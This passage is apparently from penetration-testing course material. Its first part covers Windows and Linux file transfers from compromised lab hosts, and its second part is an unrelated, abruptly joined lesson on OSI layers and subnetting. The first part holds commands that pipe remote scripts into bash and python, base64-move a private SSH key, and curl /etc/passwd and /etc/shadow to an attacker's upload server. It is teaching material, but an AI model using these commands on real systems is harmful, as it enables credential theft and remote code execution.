here: [wsgidav github](https://github.com/mar10/wsgidav)). After installing them, we run the `wsgidav` application in the target directory.\n\n- Installing WebDav Python modules:\n\n```shell\nPietra@htb[/htb]$ sudo pip install wsgidav cheroot\n\n[sudo] password for plaintext: \nCollecting wsgidav\n  Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)\n     |████████████████████████████████| 171 kB 1.4 MB/s\n     ...SNIP...\n```\n\n- Using the WebDav Python module:\n\n```shell\nPietra@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous \n\n[sudo] password for plaintext: \nRunning without configuration file.\n10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.\n10:02:53.950 - INFO    : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.31\n10:02:53.950 - INFO    : Lock manager:      LockManager(LockStorageDict)\n10:02:53.950 - INFO    : Property manager:  None\n10:02:53.950 - INFO    : Domain controller: SimpleDomainController()\n10:02:53.950 - INFO    : Registered DAV providers by route:\n10:02:53.950 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)\n10:02:53.950 - INFO    :   - '/': FilesystemProvider for path '/tmp' (Read-Write) (anonymous)\n10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.\n10:02:53.950 - WARNING : Share '/' will allow anonymous write access.\n10:02:53.950 - WARNING : Share '/:dir_browser' will allow anonymous read access.\n10:02:54.194 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.2\n10:02:54.194 - INFO    : Serving on http://0.0.0.0:80 ...\n```\n\n- Connecting to the Webdav Share\nNow we can attempt to connect to the share using the `DavWWWRoot` directory.\n\n```cmd\nC:\\htb\u003e dir \\\\192.168.49.128\\DavWWWRoot\n\n Volume in drive \\\\192.168.49.128\\DavWWWRoot has no label.\n Volume Serial Number is 0000-0000\n\n Directory of \\\\192.168.49.128\\DavWWWRoot\n\n05/18/2022  10:05 AM    \u003cDIR\u003e          .\n05/18/2022  10:05 AM    \u003cDIR\u003e          ..\n05/18/2022  10:05 AM    \u003cDIR\u003e          sharefolder\n05/18/2022  10:05 AM                13 filetest.txt\n               1 File(s)             13 bytes\n               3 Dir(s)  43,443,318,784 bytes free\n```\n\n**Note:** `DavWWWRoot` is a special keyword recognised by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.\n\nYou can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: `\\192.168.49.128\\sharefolder`.\n\n- Uploading Files using SMB\n\n```cmd\nC:\\htb\u003e copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\DavWWWRoot\\\nC:\\htb\u003e copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\sharefolder\\\n```\n\n**Note:** If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.\n\n#### FTP Uploads\nUploading files using FTP is very similar to downloading files. We can use PowerShell or the FTP client to complete the operation. Before we start our FTP Server using the Python module `pyftpdlib`, we need to specify the option `--write` to allow clients to upload files to our attack host.\n\n- Uploading files using SMB:\n\n```shell\nPietra@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write\n\n/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.\n  warnings.warn(\"write permissions assigned to anonymous user.\",\n[I 2022-05-18 10:33:31] concurrency model: async\n[I 2022-05-18 10:33:31] masquerade (NAT) address: None\n[I 2022-05-18 10:33:31] passive ports: None\n[I 2022-05-18 10:33:31] \u003e\u003e\u003e starting FTP server on 0.0.0.0:21, pid=5155 \u003c\u003c\u003c\n```\n\nNow let's use the PowerShell upload function to upload a file to our FTP Server.\n\n- PowerShell upload file:\n\n```powershell\nPS C:\\htb\u003e (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\\Windows\\System32\\drivers\\etc\\hosts')\n```\n\n- Create a command file for the FTP client to upload a file:\n\n```cmd\nC:\\htb\u003e echo open 192.168.49.128 \u003e ftpcommand.txt\nC:\\htb\u003e echo USER anonymous \u003e\u003e ftpcommand.txt\nC:\\htb\u003e echo binary \u003e\u003e ftpcommand.txt\nC:\\htb\u003e echo PUT c:\\windows\\system32\\drivers\\etc\\hosts \u003e\u003e ftpcommand.txt\nC:\\htb\u003e echo bye \u003e\u003e ftpcommand.txt\nC:\\htb\u003e ftp -v -n -s:ftpcommand.txt\nftp\u003e open 192.168.49.128\nLog in with USER and PASS first.\nftp\u003e USER anonymous\n\nftp\u003e PUT c:\\windows\\system32\\drivers\\etc\\hosts\nftp\u003e bye\n```\n# Linux\nLinux is a versatile operating system, which commonly has many different tools we can use to perform file transfers. Understanding file transfer methods in Linux can help attackers and defenders improve their skills to attack networks and prevent sophisticated attacks.\n\nA few years ago, we were contacted to perform incident response on some web servers. We found multiple threat actors in six out of the nine web servers we investigated. The threat actor found a SQL Injection vulnerability. They used a Bash script that, when executed, attempted to download another piece of malware that connected to the threat actor's command and control server.\n\nThe Bash script they used tried three download methods to get the other piece of malware that connected to the command and control server. Its first attempt was to use `cURL`. If that failed, it attempted to use `wget`, and if that failed, it used `Python`. All three methods use `HTTP` to communicate.\n\nAlthough Linux can communicate via FTP, SMB like Windows, most malware on all different operating systems uses `HTTP` and `HTTPS` for communication.\n\nThis section will review multiple ways to transfer files on Linux, including HTTP, Bash, SSH, etc.\n\n## Download Operations\nWe have access to the machine `NIX04`, and we need to download a file from our `Pwnbox` machine. Let's see how we can accomplish this using multiple file download methods.\n\n![image](https://academy.hackthebox.com/storage/modules/24/LinuxDownloadUpload.drawio.png)\n\n### Base64 Encoding / Decoding\nDepending on the file size we want to transfer, we can use a method that does not require network communication. If we have access to a terminal, we can encode a file to a base64 string, copy its content into the terminal and perform the reverse operation. Let's see how we can do this with Bash.\n\n#### Pwnbox - Check File MD5 hash\n\n```shell\nPietra@htb[/htb]$ md5sum id_rsa\n\n4e301756a07ded0a2dd6953abf015278  id_rsa\n```\n\nWe use `cat` to print the file content, and base64 encode the output using a pipe `|`. We used the option `-w 0` to create only one line and ended up with the command with a semi-colon (;) and `echo` keyword to start a new line and make it easier to copy.\n\n#### Pwnbox - Encode SSH Key to Base64\n\n```shell\nPietra@htb[/htb]$ cat id_rsa |base64 -w 0;echo\n\nLS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=\n```\n\nWe copy this content, paste it onto our Linux target machine, and use `base64` with the option \\`-d' to decode it.\n\n#### Linux - Decode the File\n\n```shell\nPietra@htb[/htb]$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d \u003e id_rsa\n```\n\nFinally, we can confirm if the file was transferred successfully using the `md5sum` command.\n\n#### Linux - Confirm the MD5 Hashes Match\n\n```shell\nPietra@htb[/htb]$ md5sum id_rsa\n\n4e301756a07ded0a2dd6953abf015278  id_rsa\n```\n\n**Note:** You can also upload files using the reverse operation. From your compromised target cat and base64 encode a file and decode it in your Pwnbox.\n\n### Web Downloads with Wget and cURL\nTwo of the most common utilities in Linux distributions to interact with web applications are `wget` and `curl`. These tools are installed on many Linux distributions.\n\nTo download a file using `wget`, we need to specify the URL and the option \\`-O' to set the output filename.\n\n#### Download a File Using wget\n\n```shell\nPietra@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh\n```\n\n`cURL` is very similar to `wget`, but the output filename option is lowercase \\`-o'.\n\n#### Download a File Using cURL\n\n```shell\nPietra@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\n```\n\n### Fileless Attacks Using Linux\nBecause of the way Linux works and how [pipes operate](https://www.geeksforgeeks.org/piping-in-unix-or-linux/), most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.\n\n**Note:** Some payloads such as `mkfifo` write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload choosen it may create temporary files on the OS.\n\nLet's take the `cURL` command we used, and instead of downloading LinEnum.sh, let's execute it directly using a pipe.\n\n#### Fileless Download with cURL\n\n```shell\nPietra@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash\n```\n\nSimilarly, we can download a Python script file from a web server and pipe it into the Python binary. Let's do that, this time using `wget`.\n\n#### Fileless Download with wget\n\n```shell\nPietra@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3\n\nHello World!\n```\n\n### Download with Bash (/dev/tcp)\nThere may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.\n\n#### Connect to the Target Webserver\n\n```shell\nPietra@htb[/htb]$ exec 3\u003c\u003e/dev/tcp/10.10.10.32/80\n```\n\n#### HTTP GET Request\n\n```shell\nPietra@htb[/htb]$ echo -e \"GET /LinEnum.sh HTTP/1.1\\n\\n\"\u003e\u00263\n```\n\n#### Print the Response\n\n```shell\nPietra@htb[/htb]$ cat \u003c\u00263\n```\n\n### SSH Downloads\nSSH (or Secure Shell) is a protocol that allows secure access to remote computers. SSH implementation comes with an `SCP` utility for remote file transfer that, by default, uses the SSH protocol.\n\n`SCP` (secure copy) is a command-line utility that allows you to copy files and directories between two hosts securely. We can copy our files from local to remote servers and from remote servers to our local machine.\n\n`SCP` is very similar to `copy` or `cp`, but instead of providing a local path, we need to specify a username, the remote IP address or DNS name, and the user's credentials.\n\nBefore we begin downloading files from our target Linux machine to our Pwnbox, let's set up an SSH server in our Pwnbox.\n\n#### Enabling the SSH Server\n\n```shell\nPietra@htb[/htb]$ sudo systemctl enable ssh\n\nSynchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.\nExecuting: /lib/systemd/systemd-sysv-install enable ssh\nUse of uninitialized value $service in hash element at /usr/sbin/update-rc.d line 26, \u003cDATA\u003e line 45\n...SNIP...\n```\n\n#### Starting the SSH Server\n\n```shell\nPietra@htb[/htb]$ sudo systemctl start ssh\n```\n\n#### Checking for SSH Listening Port\n\n```shell\nPietra@htb[/htb]$ netstat -lnpt\n\n(Not all processes could be identified, non-owned process info\n will not be shown, you would have to be root to see it all.)\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - \n```\n\nNow we can begin transferring files. We need to specify the IP address of our Pwnbox and the username and password.\n\n#### Linux - Downloading Files Using SCP\n\n```shell\nPietra@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . \n```\n\n**Note:** You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.\n\n## Upload Operations\nThere are also situations such as binary exploitation and packet capture analysis, where we must upload files from our target machine onto our attack host. The methods we used for downloads will also work for uploads. Let's see how we can upload files in various ways.\n\n### Web Upload\nAs mentioned in the `Windows File Transfer Methods` section, we can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python `HTTP.Server` module, which includes a file upload page. For this Linux example, let's see how we can configure the `uploadserver` module to use `HTTPS` for secure communication.\n\nThe first thing we need to do is to install the `uploadserver` module.\n\n#### Pwnbox - Start Web Server\n\n```shell\nPietra@htb[/htb]$ python3 -m pip install --user uploadserver\n\nCollecting uploadserver\n  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)\nInstalling collected packages: uploadserver\nSuccessfully installed uploadserver-2.0.1\n```\n\nNow we need to create a certificate. In this example, we are using a self-signed certificate.\n\n#### Pwnbox - Create a Self-Signed Certificate\n\n```shell\nPietra@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'\n\nGenerating a RSA private key\n................................................................................+++++\n.......+++++\nwriting new private key to 'server.pem'\n-----\n```\n\nThe webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.\n\n#### Pwnbox - Start Web Server\n\n```shell\nPietra@htb[/htb]$ mkdir https \u0026\u0026 cd https\n```\n\n```shell\nPietra@htb[/htb]$ python3 -m uploadserver 443 --server-certificate /root/server.pem\n\nFile upload available at /upload\nServing HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...\n```\n\nNow from our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files.\n\n#### Linux - Upload Multiple Files\n\n```shell\nPietra@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure\n```\n\nWe used the option `--insecure` because we used a self-signed certificate that we trust.\n\n### Alternative Web File Transfer Method\nSince Linux distributions usually have `Python` or `php` installed, starting a web server to transfer files is straightforward. Also, if the server we compromised is a web server, we can move the files we want to transfer to the web server directory and access them from the web page, which means that we are downloading the file from our Pwnbox.\n\nIt is possible to stand up a web server using various languages. A compromised Linux machine may not have a web server installed. In such cases, we can use a mini web server.

The /24 network allows computers to talk to each other as long as the first three octets of an IP Address are the same (ex: 192.168.1.xxx). Setting the subnet mask to `/25` divides this range in half, and the computer will be able to talk to only the computers on \"its half.\" We have seen Penetration Test reports where the assessor claimed a Domain Controller was offline when it was just on a different network in reality. The network structure was something like this:\n\n-   Server Gateway: 10.20.0.1/25\n-   Domain Controller: 10.20.0.10/25\n-   Client Gateway: 10.20.0.129/25\n-   Client Workstation: 10.20.0.200/25\n-   Pentester IP: 10.20.0.252/24 (Set Gateway to 10.20.0.1)\n\nThe Pentester communicated with the Client Workstations and thought they did an excellent job because they managed to steal a workstation password via Impacket. However, due to a failure to understand the network, they never managed to get off the Client Network and reach more \"high value\" targets such as database servers. \n\n## Networking Models\nTwo networking models describe the communication and transfer of data from one host to another, called `ISO/OSI model` and the `TCP/IP model`. This is a simplified representation of the so-called `layers` representing transferred Bits in readable contents for us.\n\n![image](https://academy.hackthebox.com/storage/modules/34/redesigned/net_models4.png)\n\n### The OSI Model\nThe `OSI` model, often referred to as `ISO/OSI` layer model, is a reference model that can be used to describe and define the communication between systems. The reference model has `seven` individual layers, each with clearly separated tasks.\n\nThe term `OSI` stands for `Open Systems Interconnection` model, published by the `International Telecommunication Union` (`ITU`) and the `International Organization for Standardization` (`ISO`). Therefore, the `OSI` model is often referred to as the `ISO/OSI` layer model.\n\nThe goal in defining the `ISO/OSI` standard was to create a reference model that enables the communication of different technical systems via various devices and technologies and provides compatibility. The `OSI` model uses `seven` different layers, which are hierarchically based on each other to achieve this goal. These layers represent phases in the establishment of each connection through which the sent packets pass. In this way, the standard was created to trace how a connection is structured and established visually.\n\n| **Layer** | **Function** |\n| --- | --- |\n| `7.Application` | Among other things, this layer controls the input and output of data and provides the application functions. |\n| `6.Presentation` | The presentation layer's task is to transfer the system-dependent presentation of data into a form independent of the application. |\n| `5.Session` | The session layer controls the logical connection between two systems and prevents, for example, connection breakdowns or other problems. |\n| `4.Transport` | Layer 4 is used for end-to-end control of the transferred data. The Transport Layer can detect and avoid congestion situations and segment data streams. |\n| `3.Network` | On the networking layer, connections are established in circuit-switched networks, and data packets are forwarded in packet-switched networks. Data is transmitted over the entire network from the sender to the receiver. |\n| `2.Data Link` | The central task of layer 2 is to enable reliable and error-free transmissions on the respective medium. For this purpose, the bitstreams from layer 1 are divided into blocks or frames. |\n| `1.Physical` | The transmission techniques used are, for example, electrical signals, optical signals, or electromagnetic waves. Through layer 1, the transmission takes place on wired or wireless transmission lines. |\n\nThe layers `2-4` are `transport oriented`, and the layers `5-7` are `application oriented` layers. In each layer, precisely defined tasks are performed, and the interfaces to the neighbouring layers are precisely described. Each layer offers services for use to the layer directly above it. To make these services available, the layer uses the services of the layer below it and performs the tasks of its layer.\n\nIf two systems communicate, all seven layers of the `OSI` model are run through at least `twice`, since both the sender and the receiver must take the layer model into account. Therefore, a large number of different tasks must be performed in the individual layers to ensure the communication's security, reliability, and performance.\n\nWhen an application sends a packet to the other system, the system works the layers shown above from layer `7` down to layer `1`, and the receiving system unpacks the received packet from layer `1` up to layer `7`.\n\n### The TCP/IP Model\n`TCP/IP` (`Transmission Control Protocol`/`Internet Protocol`) is a generic term for many network protocols. The protocols are responsible for the switching and transport of data packets on the Internet. The Internet is entirely based on the `TCP/IP` protocol family. However, `TCP/IP` does not only refer to these two protocols but is usually used as a generic term for an entire protocol family.\n\nFor example, `ICMP` (`Internet Control Message Protocol`) or `UDP` (`User Datagram Protocol`) belongs to the protocol family. The protocol family provides the necessary functions for transporting and switching data packets in a private or public network.\n\nThe most important tasks of `TCP/IP` are:\n\n| **Task** | **Protocol** | **Description** |\n| --- | --- | --- |\n| `Logical Addressing` | `IP` | Due to many hosts in different networks, there is a need to structure the network topology and logical addressing. Within TCP/IP, IP takes over the logical addressing of networks and nodes. Data packets only reach the network where they are supposed to be. The methods to do so are `network classes`, `subnetting`, and `CIDR`. |\n| `Routing` | `IP` | For each data packet, the next node is determined in each node on the way from the sender to the receiver. This way, a data packet is routed to its receiver, even if its location is unknown to the sender. |\n| `Error \u0026 Control Flow` | `TCP` | The sender and receiver are frequently in touch with each other via a virtual connection. Therefore control messages are sent continuously to check if the connection is still established. |\n| `Application Support` | `TCP` | TCP and UDP ports form a software abstraction to distinguish specific applications and their communication links. |\n| `Name Resolution` | `DNS` | DNS provides name resolution through Fully Qualified Domain Names (FQDN) in IP addresses, enabling us to reach the desired host with the specified name on the internet. |\n\n### ISO/OSI vs. TCP/IP\n`TCP/IP` is a communication protocol that allows hosts to connect to the Internet. It refers to the `Transmission Control Protocol` used in and by applications on the Internet. In contrast to `OSI`, it allows a lightening of the rules that must be followed, provided that general guidelines are followed.\n\n`OSI`, on the other hand, is a communication gateway between the network and end-users. The OSI model is usually referred to as the reference model because it is older. It is also known for its strict protocol and limitations.\n\n## Packet Transfers\nIn a layered system, devices in a layer exchange data in a different format called a `protocol data unit` (`PDU`). For example, when we want to browse a website on the computer, the remote server software first passes the requested data to the application layer. It is processed layer by layer, each layer performing its assigned functions. The data is then transferred through the network's physical layer until the destination server or another device receives it. The data is routed through the layers again, with each layer performing its assigned operations until the receiving software uses the data.\n\n![image](https://academy.hackthebox.com/storage/modules/34/redesigned/net_models_pdu2.png)\n\nDuring the transmission, each layer adds a `header` to the `PDU` from the upper layer, which controls and identifies the packet. This process is called `encapsulation`. The header and the data together form the PDU for the next layer. The process continues to the `Physical Layer` or `Network Layer`, where the data is transmitted to the receiver. The receiver reverses the process and unpacks the data on each layer with the header information. After that, the application finally uses the data. This process continues until all data has been sent and received.\n\n![image](https://academy.hackthebox.com/storage/modules/34/packet_transfer.png)\n\nFor us, as penetration testers, both reference models are useful. With `TCP/IP`, we can quickly understand how the entire connection is established, and with `ISO`, we can take it apart piece by piece and analyse it in detail. This often happens when we can listen to and intercept specific network traffic. We then have to analyse this traffic accordingly, going into more detail in the `Network Traffic Analysis` module. Therefore, we should familiarise ourselves with both reference models and understand and internalise them in the best possible way.\n\n## Subnetting\nThe division of an address range of IPv4 addresses into several smaller address ranges is called `subnetting`.\n\nA subnet is a logical segment of a network that uses IP addresses with the same network address. We can think of a subnet as a labeled entrance on a large building corridor. For example, this could be a glass door that separates various departments of a company building. With the help of subnetting, we can create a specific subnet by ourselves or find out the following outline of the respective network:\n\n-   `Network address`\n-   `Broadcast address`\n-   `First host`\n-   `Last host`\n-   `Number of hosts`\n\nLet us take the following IPv4 address and subnet mask as an example:\n\n-   IPv4 Address: `192.168.12.160`\n-   Subnet Mask: `255.255.255.192`\n-   CIDR: `192.168.12.160/26`\n\nWe already know that an IP address is divided into the `network part` and the `host part`.\n\n#### Network Part\n\n| **Details of** | **1st Octet** | **2nd Octet** | **3rd Octet** | **4th Octet** | **Decimal** |\n| --- | --- | --- | --- | --- | --- |\n| IPv4 | `1100 0000` | `1010 1000` | `0000 1100` | `10`10 0000 | 192.168.12.160`/26` |\n| Subnet mask | `1111 1111` | `1111 1111` | `1111 1111` | `11`00 0000 | `255.255.255.192` |\n| Bits | /8 | /16 | /24 | /32 |  |\n\nIn subnetting, we use the subnet mask as a template for the IPv4 address. From the `1`\\-bits in the subnet mask, we know which bits in the IPv4 address `cannot` be changed. These are `fixed` and therefore determine the \"main network\" in which the subnet is located.\n\n#### Host Part\n\n| **Details of** | **1st Octet** | **2nd Octet** | **3rd Octet** | **4th Octet** | **Decimal** |\n| --- | --- | --- | --- | --- | --- |\n| IPv4 | 1100 0000 | 1010 1000 | 0000 1100 | 10`10 0000` | 192.168.12.160/26 |\n| Subnet mask | 1111 1111 | 1111 1111 | 1111 1111 | 11`00 0000` | 255.255.255.192 |\n| Bits | /8 | /16 | /24 | /32 |  |\n\nThe bits in the `host part` can be changed to the `first` and `last` address. The first address is the `network address`, and the last address is the `broadcast address` for the respective subnet.\n\nThe `network address` is vital for the delivery of a data packet. If the `network address` is the same for the source and destination address, the data packet is delivered within the same subnet. If the network addresses are different, the data packet must be routed to another subnet via the `default gateway`.\n\nThe `subnet mask` determines where this separation occurs.\n\n#### Separation Of Network \u0026 Host Parts\n\n| **Details of** | **1st Octet** | **2nd Octet** | **3rd Octet** | **4th Octet** | **Decimal** |\n| --- | --- | --- | --- | --- | --- |\n| IPv4 | 1100 0000 | 1010 1000 | 0000 1100 | 10`|`10 0000 | 192.168.12.160/26 |\n| Subnet mask | `1111 1111` | `1111 1111` | `1111 1111` | `11|`00 0000 | 255.255.255.192 |\n| Bits | /8 | /16 | /24 | /32 |  |\n\n#### Network Address\n\nSo if we now set all bits to `0` in the `host part` of the IPv4 address, we get the respective subnet's `network address`.\n\n| **Details of** | **1st Octet** | **2nd Octet** | **3rd Octet** | **4th Octet** | **Decimal** |\n| --- | --- | --- | --- | --- | --- |\n| IPv4 | 1100 0000 | 1010 1000 | 0000 1100 | 10`|00 0000` | `192.168.12.128`/26 |\n| Subnet mask | `1111 1111` | `1111 1111` | `1111 1111` | `11|`00 0000 | 255.255.255.192 |\n| Bits | /8 | /16 | /24 | /32 |  |\n\n#### Broadcast Address\n\nIf we set all bits in the `host part` of the IPv4 address to `1`, we get the `broadcast address`.\n\n| **Details of** | **1st Octet** | **2nd Octet** | **3rd Octet** | **4th Octet** | **Decimal** |\n| --- | --- | --- | --- | --- | --- |\n| IPv4 | 1100 0000 | 1010 1000 | 0000 1100 | 10`|11 1111` | `192.168.12.191`/26 |\n| Subnet mask | `1111 1111` | `1111 1111` | `1111 1111` | `11|`00 0000 | 255.255.255.192 |\n| Bits | /8 | /16 | /24 | /32 |  |\n\nSince we now know that the IPv4 addresses `192.168.12.128` and `192.168.12.191` are assigned, all other IPv4 addresses are accordingly between `192.168.12.129-190`. Now we know that this subnet offers us a total of `64 - 2` (network address \u0026 broadcast address) or `62` IPv4 addresses that we can assign to our hosts.\n\n| **Hosts** | **IPv4** |\n| --- | --- |\n| Network Address | `192.168.12.128` |\n| First Host | `192.168.12.129` |\n| Other Hosts | `...` |\n| Last Host | `192.168.12.190` |\n| Broadcast Address | `192.168.12.191` |\n\n## Subnetting Into Smaller Networks\nLet us now assume that we, as administrators, have been given the task of dividing the subnet assigned to us into 4 additional subnets. Thus, it is essential to know that we can only divide the subnets based on the binary system.\n\n| **Exponent** | **Value** |\n| --- | --- |\n| 2`^0` | \\= 1 |\n| 2`^1` | \\= 2 |\n| 2`^2` | \\= 4 |\n| 2`^3` | \\= 8 |\n| 2`^4` | \\= 16 |\n| 2`^5` | \\= 32 |\n| 2`^6` | \\= 64 |\n| 2`^7` | \\= 128 |\n| 2`^8` | \\= 256 |\n\n___\n\nTherefore we can divide the `64 hosts` we know by `4`. The `4` is equal to the exponent 2`^2` in the binary system, so we find out the number of bits for the subnet mask by which we have to extend it. So we know the following parameters:\n\n-   Subnet: `192.168.12.128/26`\n-   Required Subnets: `4`\n\nNow we increase/expand our subnet mask by `2 bits` from `/26` to `/28`, and it looks like this:\n\n| **Details of** | **1st Octet** | **2nd Octet** | **3rd Octet** | **4th Octet** | **Decimal** |\n| --- | --- | --- | --- | --- | --- |\n| IPv4 | 1100 0000 | 1010 1000 | 0000 1100 | 1000`|` 0000 | 192.168.12.128`/28` |\n| Subnet mask | `1111 1111` | `1111 1111` | `1111 1111` | `1111|` 0000 | `255.255.255.240` 